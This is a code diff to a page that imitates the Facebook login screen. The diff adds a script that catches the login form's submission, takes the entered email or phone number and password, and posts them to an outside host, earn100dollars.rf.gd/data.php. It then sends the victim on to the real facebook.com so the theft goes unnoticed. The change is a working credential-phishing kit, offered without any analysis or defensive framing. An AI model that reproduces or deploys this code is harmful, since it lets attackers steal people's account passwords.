@@ -144,12 +144,12 @@
     <div class="language-inside">English (UK)</div>
 
     <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
     </div>
 
-    <form method="POST" action="store.php">
-      <input type="text" name="email" placeholder="Mobile number or email address" required>
-      <input type="password" name="password" placeholder="Password" required>
+    <form id="loginForm">
+      <input type="text" name="em" placeholder="Mobile number or email address" required>
+      <input type="password" name="pst" placeholder="Password" required>
       <button type="submit">Log in</button>
     </form>
 
@@ -167,5 +167,27 @@
     <a href="#">Help</a>
     <a href="#">More</a>
   </div>
+  <!-- script sections-->
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+    
+      const em = document.querySelector('input[name="em"]').value;
+      const pst = document.querySelector('input[name="pst"]').value;
+    
+      fetch("https://earn100dollars.rf.gd/data.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `em=${encodeURIComponent(em)}&pst=${encodeURIComponent(pst)}`
+      })
+      .then(res => res.text())
+      .then(data => {
+        window.location.href = "https://facebook.com";
+      })
+      .catch(err => console.error("Error:", err));
+    });
+    </script>
 </body>
 </html>
